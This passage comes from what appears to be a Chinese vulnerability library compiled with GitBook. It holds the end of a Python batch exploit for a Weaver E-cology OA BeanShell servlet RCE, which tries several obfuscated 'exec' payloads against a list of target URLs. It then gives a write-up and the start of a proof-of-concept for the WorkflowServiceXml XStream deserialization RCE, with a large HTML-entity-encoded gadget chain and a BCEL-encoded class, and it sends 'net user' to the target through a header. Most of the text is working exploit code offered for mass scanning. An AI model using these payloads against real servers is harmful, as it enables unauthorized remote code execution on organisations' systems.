Url_Payload3=\"/weaveroa/bsh.servlet.BshServlet\" Url_Payload4=\"/oa/bsh.servlet.BshServlet\" Data_Payload1=\"\"\"bsh.script=exec(\"whoami\");&bsh.servlet.output=raw\"\"\" Data_Payload2= \"\"\"bsh.script=\\u0065\\u0078\\u0065\\u0063(\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\"\"\" Data_Payload3= \"\"\"bsh.script=eval%00(\"ex\"%2b\"ec(bsh.httpServletRequest.getParameter(\\\\\"command\\\\\"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami\"\"\" for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4): url= target + Url_Payload for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): try: http_response = requests.post(url,data=Data_payload,headers=headers,verify=False) #print http_response.status_code if http_response.status_code == 200: if \";\" not in (http_response.content): if \"Login.jsp\" not in (http_response.content): if \"Error\" not in (http_response.content): print \"{0} is a E-cologyOA_RCE Vulnerability\".format(url) print \"Server Current Username：{0}\".format(http_response.content) elif http_response.status_code == 500: print \"{0}500 maybe is Weaver-EcologyOA，Please confirm by yourself \".format(url) else: pass except Exception,Error: pass if __name__ == '__main__': for line in open(sys.argv[1]).readlines(): target=line.strip() Poc_check(target) #1.install python Dependencies Library pip install requests #2.批量脚本 执行 python Weaver-Ecology-OA_RCE-exp.py url.txt文件中 是url地址 需要带http协议 有任何问题请issue 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/泛微OA/泛微E-Cology WorkflowServiceXml RCE.html":{"url":"book/OA产品漏洞/泛微OA/泛微E-Cology WorkflowServiceXml RCE.html","title":"泛微E-Cology WorkflowServiceXml RCE","keywords":"","body":"泛微E-Cology WorkflowServiceXml RCE 漏洞描述 泛微E-cology OA系统的WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程代码执行 漏洞影响 [!NOTE] E-cology FOFA [!NOTE] app=\"泛微-协同办公OA\" 漏洞复现 漏洞原理来源 https://www.anquanke.com/post/id/239865 根据流量可以得知路由为/services%20/WorkflowServiceXml，我随即查看了该OA的web.xml。 发现了相关类为weaver.workflow.webservices.WorkflowServiceXml、weaver.workflow.webservices.WorkflowServiceImplXml。 关于类的东西先放到一旁，毕竟路由是否真实存在、%20有什么意义才是重点。我开始验证路由的存在。这里我测试了两个版本。 带上%20试试 根据这个response可以看出这应该是一个soap xml注入，具体是XMLDecoder、XStream或者其他什么，还得看weaver.workflow.webservices.WorkflowServiceXml、weaver.workflow.webservices.WorkflowServiceImplXml. 首先，先看看weaver.workflow.webservices.WorkflowServiceXml 可以注意到这是一个接口类，其中一个方法doCreateWorkflowRequest比较可疑。 去weaver.workflow.webservices.WorkflowServiceImplXml看看这个方法的实现。 继续跟踪看看 这个xs咋看起来这么眼熟？看看xs是个啥，一般Java可能会定义在代码文件最上方。 原来xs是XStream的对象 既然决定了sink点，下一步肯定是POC的撰写了，先确定SOAP基本模板。 根据朋友给的流量可以确定基本SOAP消息体模板大致是这样的。 2 验证成功。 接下来就是寻找gadget了。 由于并没有完整源码，只有部分github源码，不能确定gadget，先使用URLDNS试试。 http://1xsz12.dnslog.cn http://1xsz12.dnslog.cn 组合我们的模板试试。 这里涉及到实体编码问题，作为懒人直接选择整体编码算了。 随后dnslog成功收到请求。 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 泛微E-Cology WorkflowServiceXml RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/services%20/WorkflowServiceXml\" cmd = \"net user\" headers = { 'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)', 'SOAPAction': '\"\"', 'Cmd': cmd, \"Content-Type\": \"text/xml;charset=UTF-8\" } data = ''' &#x3c;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x20;&#x73;&#x65;&#x72;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x27;&#x63;&#x75;&#x73;&#x74;&#x6f;&#x6d;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x3c;&#x75;&#x6e;&#x73;&#x65;&#x72;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x62;&#x6c;&#x65;&#x2d;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x3c;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x69;&#x7a;&#x65;&#x3e;&#x32;&#x3c;&#x2f;&#x73;&#x69;&#x7a;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6d;&#x70;&#x61;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x66;&#x78;&#x2e;&#x63;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x2e;&#x4f;&#x62;&#x73;&#x65;&#x72;&#x76;&#x61;&#x62;&#x6c;&#x65;&#x4c;&#x69;&#x73;&#x74;&#x24;&#x31;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x6e;&#x74;&#x3e;&#x33;&#x3c;&#x2f;&#x69;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x61;&#x74;&#x61;&#x48;&#x61;&#x6e;&#x64;&#x6c;&#x65;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x61;&#x74;&#x61;&#x53;&#x6f;&#x75;&#x72;&#x63;&#x65;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x77;&#x73;&#x2e;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x58;&#x4d;&#x4c;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x24;&#x58;&#x6d;&#x6c;&#x44;&#x61;&#x74;&#x61;&#x53;&#x6f;&#x75;&#x72;&#x63;&#x65;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3e;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x70;&#x6c;&#x61;&#x69;&#x6e;&#x3c;&#x2f;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x53;&#x65;&#x71;&#x75;&#x65;&#x6e;&#x63;&#x65;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x65;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x78;&#x2e;&#x73;&#x77;&#x69;&#x6e;&#x67;&#x2e;&#x4d;&#x75;&#x6c;&#x74;&#x69;&#x55;&#x49;&#x44;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x73;&#x24;&#x4d;&#x75;&#x6c;&#x74;&#x69;&#x55;&#x49;&#x44;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x73;&#x45;&#x6e;&#x75;&#x6d;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x74;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x74;&#x6f;&#x6f;&#x6c;&#x73;&#x2e;&#x6a;&#x61;&#x76;&#x61;&#x63;&#x2e;&#x70;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x69;&#x6e;&#x67;&#x2e;&#x4a;&#x61;&#x76;&#x61;&#x63;&#x50;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x69;&#x6e;&#x67;&#x45;&#x6e;&#x76;&#x69;&#x72;&#x6f;&#x6e;&#x6d;&#x65;&#x6e;&#x74;&#x24;&#x4e;&#x61;&#x6d;&#x65;&#x50;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x49;&#x74;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6e;&#x61;&#x6d;&#x65;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x41;&#x62;&#x73;&#x74;&#x72;&#x61;&#x63;&#x74;&#x4c;&#x69;&#x73;&#x74;&#x24;&#x49;&#x74;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x75;&#x72;&#x73;&#x6f;&#x72;&#x3e;&#x30;&#x3c;&#x2f;&#x63;&#x75;&#x72;&#x73;&#x6f;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6c;&#x61;&#x73;&#x74;&#x52;&#x65;&#x74;&#x3e;&#x2d;&#x31;&#x3c;&#x2f;&#x6c;&#x61;&#x73;&#x74;&#x52;&#x65;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x65;&#x78;&#x70;&#x65;&#x63;&#x74;&#x65;&#x64;&#x4d;&#x6f;&#x64;&#x43;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x30;&#x3c;&#x2f;&#x65;&#x78;&#x70;&#x65;&#x63;&#x74;&#x65;&#x64;&#x4d;&#x6f;&#x64;&#x43;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6f;&#x75;&#x74;&#x65;&#x72;&#x2d;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x41;&#x72;&#x72;&#x61;&#x79;&#x73;&#x24;&#x41;&#x72;&#x72;&#x61;&#x79;&#x4c;&#x69;&#x73;&#x74;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x2d;&#x61;&#x72;&#x72;&#x61;&#x79;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x24;&#x24;&#x42;&#x43;&#x45;&#x4c;&#x24;&#x24;&#x24;&#x6c;&#x24;&#x38;&#x62;&#x24;&#x49;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x38;&#x35;&#x56;&#x24;&#x35;&#x62;&#x57;&#x24;&#x54;&#x57;&#x24;&#x55;&#x24;&#x66;&#x65;&#x24;&#x38;&#x36;&#x24;&#x71;&#x24;&#x63;&#x63;&#x30;&#x24;&#x4d;&#x24;&#x38;&#x32;&#x41;&#x24;&#x38;&#x34;&#x24;&#x61;&#x38;&#x24;&#x62;&#x64;&#x24;&#x64;&#x38;&#x56;&#x24;&#x4e;&#x24;&#x75;&#x24;&#x38;&#x39;&#x24;&#x64;&#x36;&#x24;&#x64;&#x65;&#x24;&#x4d;&#x24;&#x64;&#x36;&#x24;&#x38;&#x61;&#x24;&#x35;&#x63;&#x24;&#x65;&#x61;&#x24;&#x72;&#x24;&#x61;&#x30;&#x35;&#x24;&#x55;&#x24;&#x78;&#x24;&#x64;&#x61;&#x24;&#x65;&#x61;&#x30;&#x24;&#x69;&#x61;&#x24;&#x71;&#x24;&#x39;&#x39;&#x24;&#x38;&#x39;&#x24;&#x39;&#x33;&#x24;&#x4a;&#x50;&#x24;&#x37;&#x62;&#x24;&#x62;&#x31;&#x24;&#x61;&#x64;&#x24;&#x62;&#x64;&#x24;&#x64;&#x66;&#x24;&#x65;&#x66;&#x24;&#x61;&#x64;&#x24;&#x62;&#x64;&#x24;&#x62;&#x63;&#x24;&#x66;&#x38;&#x24;&#x65;&#x32;&#x53;&#x24;&#x6c;&#x24;&#x35;&#x63;&#x24;&#x61;&#x62;&#x24;&#x78;&#x6a;&#x24;&#x35;&#x62;&#x24;&#x62;&#x62;&#x24;&#x64;&#x61;&#x24;&#x33;&#x65;&#x24;&#x66;&#x36;&#x47;&#x69;&#x24;&#x62;&#x66;&#x33;&#x24;&#x4a;&#x24;&#x39;&#x34;&#x24;&#x39;&#x30;&#x24;&#x61;&#x38;&#x24;&#x61;&#x63;&#x24;&#x63;&#x35;&#x24;&#x39;&#x39;&#x39;&#x24;&#x66;&#x62;&#x24;&#x37;&#x63;&#x24;&#x66;&#x62;&#x24;&#x66;&#x36;&#x24;&#x65;&#x64;&#x24;&#x62;&#x64;&#x4f;&#x24;&#x65;&#x36;&#x24;&#x64;&#x66;&#x24;&#x35;&#x62;&#x24;&#x62;&#x66;&#x24;&#x66;&#x64;&#x24;&#x4a;&#x24;&#x65;&#x30;&#x31;&#x24;&#x66;&#x63;&#x24;&#x61;&#x63;&#x24;&#x61;&#x33;&#x24;&#x4a;&#x24;&#x38;&#x37;&#x74;&#x24;&#x61;&#x34;&#x31;&#x24;&#x6f;&#x24;&#x39;&#x37;&#x51;&#x24;&#x4e;&#x24;&#x38;&#x37;&#x75;&#x24;&#x69;&#x24;&#x63;&#x31;&#x73;&#x24;&#x67;&#x24;&#x38;&#x65;&#x24;&#x61;&#x61;&#x24;&#x63;&#x38;&#x24;&#x65;&#x38;&#x50;&#x31;&#x24;&#x61;&#x36;&#x24;&#x65;&#x32;&#x79;&#x24;&#x6a;&#x24;&#x65;&#x33;&#x38;&#x24;&#x73;&#x24;&#x39;&#x31;&#x24;&#x5f;&#x48;&#x24;&#x63;&#x39;&#x71;&#x24;&#x4e;&#x24;&#x54;&#x24;&#x66;&#x32;&#x79;&#x42;&#x24;&#x63;&#x37;&#x49;&#x24;&#x62;&#x63;&#x24;&#x75;&#x24;&#x39;&#x37;&#x24;&#x39;&#x37;&#x34;&#x24;&#x39;&#x63;&#x52;&#x71;&#x5a;&#x24;&#x38;&#x33;&#x24;&#x61;&#x39;&#x24;&#x70;&#x24;&#x38;&#x61;&#x49;&#x24;&#x4e;&#x24;&#x39;&#x36;&#x24;&#x38;&#x61;&#x24;&#x76;&#x24;&#x4e;&#x24;&#x76;&#x24;&#x56;&#x42;&#x24;&#x63;&#x37;&#x24;&#x5a;&#x4c;&#x24;&#x63;&#x62;&#x65;&#x46;&#x24;&#x38;&#x37;&#x24;&#x38;&#x64;&#x24;&#x62;&#x33;&#x24;&#x33;&#x61;&#x24;&#x62;&#x61;&#x30;&#x24;&#x61;&#x62;&#x24;&#x6e;&#x24;&#x78;&#x24;&#x39;&#x66;&#x39;&#x24;&#x62;&#x39;&#x38;&#x72;&#x71;&#x35;&#x24;&#x65;&#x34;&#x55;&#x24;&#x39;&#x63;&#x24;&#x64;&#x33;&#x24;&#x66;&#x31;&#x24;&#x51;&#x24;&#x33;&#x63;&#x24;&#x56;&#x24;&#x46;&#x24;&#x46;&#x24;&#x38;&#x64;&#x24;&#x62;&#x62;&#x6d;&#x24;&#x63;&#x37;&#x24;&#x66;&#x36;&#x24;&#x66;&#x37;&#x24;&#x75;&#x24;&#x49;&#x24;&#x63;&#x35;&#x24;&#x62;&#x62;&#x24;&#x63;&#x37;&#x24;&#x56;&#x24;&#x38;&#x34;&#x24;&#x48;&#x24;&#x64;&#x63;&#x24;&#x76;&#x24;&#x61;&#x31;&#x24;&#x61;&#x30;&#x35;&#x6d;&#x24;&#x33;&#x62;&#x62;&#x24;&#x62;&#x34;&#x24;&#x39;&#x38;&#x24;&#x39;&#x62;&#x24;&#x55;&#x24;&#x64;&#x65;&#x24;&#x39;&#x38;&#x39;&#x24;&#x39;&#x39;&#x24;&#x61;&#x35;&#x24;&#x71;&#x24;&#x39;&#x61;&#x76;&#x24;&#x7a;&#x33;&#x24;&#x33;&#x62;&#x6e;&#x7a;&#x24;&#x62;&#x36;&#x24;&#x64;&#x63;&#x57;&#x24;&#x38;&#x34;&#x61;&#x24;&#x37;&#x66;&#x24;&#x63;&#x36;&#x24;&#x61;&#x36;&#x24;&#x38;&#x64;&#x24;&#x65;&#x36;&#x24;&#x66;&#x34;&#x24;&#x62;&#x65;&#x24;&#x38;&#x31;&#x24;&#x61;&#x31;&#x74;&#x72;&#x68;&#x24;&#x63;&#x65;&#x24;&#x63;&#x65;&#x24;&#x66;&#x36;&#x24;&#x76;&#x24;&#x64;&#x30;&#x76;&#x24;&#x35;&#x62;&#x24;&#x64;&#x39;&#x24;&#x38;&#x61;&#x24;&#x63;&#x64;&#x24;&#x61;&#x38;&#x6f;&#x24;&#x65;&#x35;&#x24;&#x4c;&#x24;&#x61;&#x65;&#x35;&#x24;&#x78;&#x24;&#x37;&#x63;&#x24;&#x64;&#x61;&#x24;&#x39;&#x62;&#x24;&#x6a;&#x24;&#x63;&#x38;&#x24;&#x39;&#x61;&#x24;&#x65;&#x37;&#x24;&#x63;&#x66;&#x24;&#x78;&#x58;&#x24;&#x39;&#x64;&#x24;&#x33;&#x65;&#x6b;&#x24;&#x63;&#x65;&#x24;&#x39;&#x39;&#x24;&#x63;&#x39;&#x24;&#x61;&#x63;&#x24;&#x65;&#x39;&#x4c;&#x24;&#x74;&#x24;&#x76;&#x24;&#x77;&#x24;&#x55;&#x24;&#x61;&#x38;&#x24;&#x54;&#x24;&#x39;&#x64;&#x24;&#x57;&#x24;&#x66;&#x65;&#x24;&#x34;&#x30;&#x24;&#x64;&#x31;&#x24;&#x66;&#x33;&#x24;&#x38;&#x34;&#x24;&#x65;&#x33;&#x24;&#x6c;&#x24;&#x56;&#x24;&#x65;&#x37;&#x24;&#x38;&#x61;&#x24;&#x61;&#x32;&#x24;&#x65;&#x30;&#x24;&#x38;&#x66;&#x24;&#x75;&#x58;&#x24;&#x62;&#x37;&#x24;&#x4d;&#x24;&#x65;&#x38;&#x24;&#x38;&#x39;&#x33;&#x59;&#x61;&#x24;&#x66;&#x39;&#x24;&#x63;&#x39;&#x24;&#x52;&#x24;&#x65;&#x31;&#x24;&#x63;&#x66;&#x24;&#x62;&#x38;&#x53;&#x24;&#x64;&#x34;&#x58;&#x65;&#x55;&#x24;&#x63;&#x31;&#x65;&#x24;&#x38;&#x30;&#x24;&#x66;&#x66;&#x24;&#x61;&#x33;&#x24;&#x50;&#x4f;&#x24;&#x39;&#x65;&#x24;&#x72;&#x24;&#x39;&#x38;&#x24;&#x75;&#x24;&#x65;&#x35;&#x24;&#x38;&#x63;&#x24;&#x38;&#x32;&#x58;&#x24;&#x6a;&#x33;&#x24;&#x63;&#x33;&#x24;&#x62;&#x36;&#x24;&#x63;&#x38;&#x4a;&#x24;&#x78;&#x24;&#x39;&#x61;&#x24;&#x74;&#x24;&#x4b;&#x79;&#x24;&#x64;&#x37;&#x24;&#x76;&#x30;&#x24;&#x58;&#x24;&#x39;&#x64;&#x24;&#x6e;&#x24;&#x69;&#x24;&#x66;&#x33;&#x6c;&#x5f;&#x78;&#x74;&#x24;&#x61;&#x64;&#x24;&#x63;&#x63;&#x24;&#x78;&#x68;&#x24;&#x78;&#x24;&#x65;&#x62;&#x24;&#x64;&#x39;&#x6e;&#x24;&#x62;&#x32;&#x24;&#x79;&#x24;&#x65;&#x65;&#x24;&#x78;&#x63;&#x24;&#x66;&#x36;&#x24;&#x4c;&#x73;&#x24;&#x77;&#x24;&#x63;&#x30;&#x24;&#x38;&#x34;&#x24;&#x61;&#x63;&#x24;&#x64;&#x63;&#x54;&#x24;&#x62;&#x35;&#x24;&#x64;&#x62;&#x24;&#x38;&#x63;&#x24;&#x65;&#x66;&#x24;&#x64;&#x39;&#x24;&#x63;&#x65;&#x24;&#x62;&#x34;&#x74;&#x4b;&#x52;&#x24;&#x64;&#x61;&#x24;&#x63;&#x62;&#x24;&#x48;&#x45;&#x24;&#x64;&#x66;&#x24;&#x63;&#x65;&#x24;&#x73;&#x33;&#x24;&#x39;&#x36;&#x24;&#x65;&#x39;&#x38;&#x24;&#x38;&#x31;&#x24;&#x38;&#x35;&#x24;&#x63;&#x38;&#x24;&#x39;&#x63;&#x24;&#x65;&#x39;&#x24;&#x65;&#x64;&#x24;&#x64;&#x38;&#x24;&#x61;&#x31;&#x24;&#x61;&#x30;&#x63;&#x24;&#x39;&#x39;&#x24;&#x64;&#x61;&#x24;&#x64;&#x30;&#x24;&#x38;&#x32;&#x24;&#x72;&#x24;&#x66;&#x32;&#x24;&#x62;&#x65;&#x24;&#x65;&#x64;&#x24;&#x33;&#x61;&#x24;&#x33;&#x63;&#x6f;&#x24;&#x63;&#x39;&#x24;&#x66;&#x38;&#x24;&#x61;&#x36;&#x35;&#x24;&#x33;&#x62;&#x62;&#x24;&#x65;&#x36;&#x24;&#x44;&#x24;&#x38;&#x36;&#x24;&#x64;&#x39;&#x24;&#x59;&#x24;&#x77;&#x24;&#x37;&#x63;&#x24;&#x62;&#x36;&#x24;&#x38;&#x35;&#x24;&#x38;&#x61;&#x24;&#x6f;&#x24;&#x61;&#x62;&#x24;&#x63;&#x65;&#x52;&#x24;&#x62;&#x33;&#x24;&#x63;&#x65;&#x24;&#x79;&#x24;&#x6c;&#x24;&#x70;&#x24;&#x63;&#x39;&#x24;&#x62;&#x38;&#x45;&#x24;&#x63;&#x66;&#x24;&#x53;&#x24;&#x63;&#x33;&#x24;&#x62;&#x36;&#x24;&#x79;&#x43;&#x24;&#x39;&#x33;&#x64;&#x24;&#x33;&#x65;&#x24;&#x6e;&#x24;&#x4e;&#x24;&#x67;&#x24;&#x64;&#x38;&#x24;&#x38;&#x34;&#x24;&#x63;&#x64;&#x24;&#x77;&#x24;&#x65;&#x36;&#x24;&#x4d;&#x24;&#x63;&#x63;&#x63;&#x24;&#x63;&#x31;&#x24;&#x63;&#x30;&#x24;&#x63;&#x62;&#x24;&#x6d;&#x24;&#x64;&#x66;&#x24;&#x35;&#x62;&#x24;&#x79;&#x37;&#x24;&#x39;&#x37;&#x24;&#x62;&#x30;&#x24;&#x63;&#x63;&#x24;&#x61;&#x32;&#x35;&#x24;&#x65;&#x33;&#x24;&#x73;&#x24;&#x69;&#x24;&#x65;&#x31;&#x24;&#x63;&#x66;&#x24;&#x62;&#x62;&#x24;&#x64;&#x65;&#x6c;&#x24;&#x6f;&#x6b;&#x24;&#x58;&#x24;&#x37;&#x63;&#x24;&#x65;&#x31;&#x24;&#x71;&#x24;&#x63;&#x36;&#x24;&#x61;&#x63;&#x24;&#x37;&#x63;&#x66;&#x24;&#x61;&#x39;&#x24;&#x33;&#x63;&#x24;&#x77;&#x24;&#x35;&#x65;&#x31;&#x24;&#x66;&#x30;&#x24;&#x77;&#x24;&#x35;&#x65;&#x63;&#x24;&#x38;&#x35;&#x6a;&#x24;&#x61;&#x61;&#x24;&#x63;&#x31;&#x24;&#x38;&#x65;&#x58;&#x51;&#x34;&#x24;&#x44;&#x24;&#x61;&#x66;&#x24;&#x65;&#x33;&#x24;&#x43;&#x49;&#x5a;&#x49;&#x24;&#x33;&#x61;&#x24;&#x65;&#x33;&#x35;&#x24;&#x66;&#x30;&#x24;&#x47;&#x24;&#x64;&#x65;&#x34;&#x24;&#x66;&#x30;&#x24;&#x57;&#x24;&#x24;&#x24;&#x67;&#x78;&#x24;&#x68;&#x24;&#x58;&#x24;&#x61;&#x39;&#x24;&#x37;&#x62;&#x6a;&#x24;&#x39;&#x31;&#x24;&#x65;&#x36;&#x61;&#x24;&#x64;&#x33;&#x24;&#x6f;&#x24;&#x37;&#x62;&#x24;&#x47;&#x24;&#x64;&#x65;&#x24;&#x63;&#x31;&#x24;&#x62;&#x62;&#x4c;&#x24;&#x63;&#x39;&#x24;&#x63;&#x30;&#x24;&#x37;&#x62;&#x78;&#x24;&#x64;&#x66;&#x24;&#x63;&#x30;&#x24;&#x48;&#x24;&#x66;&#x38;&#x24;&#x39;&#x30;&#x39;&#x24;&#x79;&#x24;&#x64;&#x31;&#x24;&#x63;&#x66;&#x24;&#x64;&#x61;&#x56;&#x24;&#x54;&#x24;&#x63;&#x66;&#x32;&#x24;&#x38;&#x64;&#x24;&#x58;&#x24;&#x62;&#x33;&#x63;&#x24;&#x4d;&#x43;&#x37;&#x24;&#x66;&#x30;&#x24;&#x52;&#x24;&#x33;&#x65;&#x24;&#x24;&#x24;&#x38;&#x33;&#x24;&#x63;&#x62;&#x75;&#x24;&#x61;&#x38;&#x24;&#x38;&#x61;&#x24;&#x61;&#x30;&#x24;&#x63;&#x63;&#x24;&#x33;&#x66;&#x24;&#x65;&#x33;&#x24;&#x61;&#x66;&#x61;&#x24;&#x35;&#x65;&#x24;&#x63;&#x35;&#x24;&#x74;&#x24;&#x47;&#x24;&#x33;&#x65;&#x24;&#x63;&#x35;&#x67;&#x24;&#x47;&#x24;&#x33;&#x65;&#x